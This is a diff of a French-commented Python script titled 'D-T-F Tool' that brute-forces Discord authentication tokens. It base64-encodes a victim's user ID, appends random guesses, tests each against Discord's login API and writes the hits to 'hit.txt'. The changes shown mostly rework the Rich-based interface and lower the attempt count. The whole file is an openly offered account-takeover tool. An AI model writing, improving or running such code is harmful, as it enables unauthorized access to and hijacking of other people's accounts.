@@ -1,18 +1,16 @@
 import base64
-import os
 import random
 import string
 import requests
-from colorama import Fore, Style, init
+from colorama import init
 from rich.console import Console
-from rich.progress import Progress
+from rich.layout import Layout
 from rich.panel import Panel
 from rich.text import Text
+from rich.table import Table
 
-# Initialisation de Colorama
+# Initialisation de Colorama et Rich
 init(autoreset=True)
-
-# Création de la console Rich
 console = Console()
 
 # URL pour vérifier les mises à jour
@@ -48,73 +46,79 @@ def generate_token(id_to_token):
 
 # Fonction principale
 def main():
-    # Logo ASCII
+    # Afficher le logo au centre
     logo = """
-
-
-      █▒█                        
-    ███████                      
-   █░███████                     
-  ███████▓███████▒█              
- ███████  ██████████▓██▒███▓     
-███████  ██  ▓▓██████████▓ ▓██   
-█████   ▒█▓    ▒███▒▓▓▒  ▓█████  
-███▓     ▒      ▓██      ███████ 
-        ▒   ▒▒▒▓██     ░  ██████ 
-        ▒█░    ██▓▓▓▒  ▒  ███████
-        ███▓EZIO░      ░   ██████
-        ▓███▓ D-T-F  ▓▓      ████ 
-       █████░█▓██▓               
-  ▓      █▓▓▒███████             
-  ██     ██░▒█████▒██▓           
- ████   ████▒███████▓▒████       
- ▓   █ ▓██████████████████       
-   ░   ▓▒█████████▓█████▓░       
-     ██   ██▓      ▒███          
-
-
+┳┓  ┏┳┓  ┏┓
+┃┃   ┃   ┣ 
+┻┛   ┻   ┻ 
+EZIO/ErrorNoName        
     """
-    console.print(Text(logo, justify="center", style="bold cyan"))
-    
+    console.print(Panel(Text(logo, justify="center"), title="D-T-F Tool", style="bold cyan", expand=True))
+
     # Vérification des mises à jour
     check_updates()
 
-    # Demander l'ID utilisateur
-    console.print("[cyan]Entrez votre ID pour générer les tokens :[/cyan]")
-    id_input = input(Fore.CYAN + "ID TO TOKEN --> ")
+    # Créer une interface centrée pour saisir l'ID
+    id_box = Panel(
+        Text("Entrez votre ID pour générer les tokens :\n", justify="center"),
+        title="Saisie de l'ID",
+        style="bold magenta",
+        expand=True,
+    )
+    console.print(id_box)
+    id_input = console.input("[bold cyan]→ ID TO TOKEN : [/]")
+
+    # Encodage de l'ID
     id_to_token = base64.b64encode(id_input.encode("ascii")).decode("ascii")
 
+    # Boîte d'attente avec bouton simulé
+    console.print(
+        Panel(
+            Text("[bold green]Appuyez sur [ Entrée ] pour démarrer la génération et la vérification des tokens ![/bold green]", justify="center"),
+            style="bold blue",
+        )
+    )
+    console.input("")  # Attente de validation
+
+    # Initialisation des tableaux pour les résultats
     valid_tokens = []
     invalid_tokens = []
 
-    # Afficher l'interface avec Rich
-    with Progress() as progress:
-        task = progress.add_task("[cyan]Génération et vérification des tokens...[/cyan]", total=900)
+    # Progression
+    console.print("[cyan]Génération des tokens en cours...[/cyan]")
+    for _ in range(100):  # Nombre de tokens à tester
+        token = generate_token(id_to_token)
+        headers = {'Authorization': token}
+        response = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
 
-        for _ in range(900):
-            token = generate_token(id_to_token)
-            headers = {'Authorization': token}
-            login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
+        if response.status_code == 200:
+            valid_tokens.append(token)
+        else:
+            invalid_tokens.append(token)
 
-            if login.status_code == 200:
-                valid_tokens.append(token)
-                console.print(f"[green][+] VALID[/green] {token}")
-            else:
-                invalid_tokens.append(token)
-                console.print(f"[red][-] INVALID[/red] {token}")
+    # Résultats dans des tableaux Rich
+    table_valid = Table(title="Tokens Valides")
+    table_valid.add_column("Token", justify="center")
+    for token in valid_tokens:
+        table_valid.add_row(f"[green]{token}[/green]")
 
-            progress.advance(task, 1)
+    table_invalid = Table(title="Tokens Invalides")
+    table_invalid.add_column("Token", justify="center")
+    for token in invalid_tokens:
+        table_invalid.add_row(f"[red]{token}[/red]")
 
-    # Résultats
-    console.print(Panel(f"[green]Tokens valides :[/green]\n" + "\n".join(valid_tokens), title="Valid Tokens"))
-    console.print(Panel(f"[red]Tokens invalides :[/red]\n" + "\n".join(invalid_tokens), title="Invalid Tokens"))
+    layout = Layout()
+    layout.split_row(
+        Panel(table_valid, title="Résultats Valides", style="bold green"),
+        Panel(table_invalid, title="Résultats Invalides", style="bold red"),
+    )
+    console.print(layout)
 
     # Enregistrer les tokens valides dans un fichier
-    console.print("[cyan]Enregistrement des tokens valides dans 'hit.txt'...[/cyan]")
     with open("hit.txt", "w") as file:
         for token in valid_tokens:
             file.write(f"{token}\n")
-    console.print("[green]Enregistrement terminé ![/green]")
+    console.print(Panel("[bold cyan]Enregistrement des tokens valides terminé dans 'hit.txt'[/bold cyan]", style="bold green"))
 
 # Exécution principale
 if __name__ == "__main__":
